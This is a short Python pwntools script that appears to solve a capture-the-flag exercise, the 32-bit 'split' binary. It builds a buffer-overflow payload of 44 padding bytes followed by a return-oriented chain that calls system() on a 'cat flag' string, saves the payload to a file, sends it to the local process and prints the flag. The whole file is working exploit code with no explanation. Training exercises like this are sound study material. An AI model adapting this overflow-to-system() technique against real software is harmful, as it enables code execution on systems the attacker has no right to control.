from pwn import *

#context.log_level = 'debug'

#addresses 
system = 0x08048657
cat_flag = 0x0804a030

def main():

    elf = context.binary = ELF('split32')

    p = process(elf.path)

    payload = 'A'*44 
    rop = p32(system)
    rop += p32(cat_flag)
    payload += rop

    f = open("pattern.txt", "w")
    f.write(payload)
    f.close()

    p.sendline(payload)

    flag = p.recvline()
    success(flag)

if __name__ == "__main__":
    main()

